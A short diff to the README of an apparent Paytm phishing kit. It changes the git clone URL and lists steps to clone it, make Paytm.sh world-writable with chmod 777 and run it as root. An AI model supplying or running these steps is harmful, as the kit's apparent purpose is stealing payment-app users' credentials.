@@ -13,7 +13,7 @@
 
 # How to Intsall & Use
 root ---must !
-1. git clone https://github.com/Ignitetch/Paytmphishing.git
+1. git clone https://github.com/Ignitetch/Paytm-Phishing.git
 2. cd Paytmphishing
 3. chmod 777 Paytm.sh
 4. ./Paytm.sh
